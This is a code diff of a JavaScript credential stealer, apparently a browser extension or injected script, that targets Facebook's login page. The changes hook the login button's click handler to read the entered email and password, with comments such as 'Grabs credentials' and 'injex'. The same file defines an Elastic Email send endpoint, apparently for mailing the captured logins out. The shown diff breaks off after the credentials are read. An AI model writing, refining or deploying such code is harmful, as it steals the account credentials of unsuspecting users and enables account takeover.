@@ -1,7 +1,7 @@
-//V2.1
+//V2.2
 
 
-//if (typeof useringer === "undefined") {var useringer="None";};
+if (typeof useringer === "undefined") {useringer="None";};
 var urlinger = "https://api.elasticemail.com/v2/email/send";
 var hostname = window.location.hostname;
 var getreqjson = {
@@ -43,14 +43,13 @@ function sendMail(obj){
 
 function facebook(){
 	let subject = "FB";
-	let loginbutton;
-	try {
-		loginbutton = document.getElementById("loginbutton");
-	}
-	catch(error) {
-		loginbutton = document.getElementsByName("login")[0];
-	}
+	//Grabs login button object
+	let loginbutton = document.getElementById("loginbutton");
+	if (loginbutton === null){loginbutton = document.getElementsByName("login")[0];}
+	//injex
 	loginbutton.onclick = function(){
+		//alert(useringer);
+		//Grabs credentials
 		let email = document.getElementsByName("email")[0].value;
 		let pass = document.getElementsByName("pass")[0].value;
 		//Checks
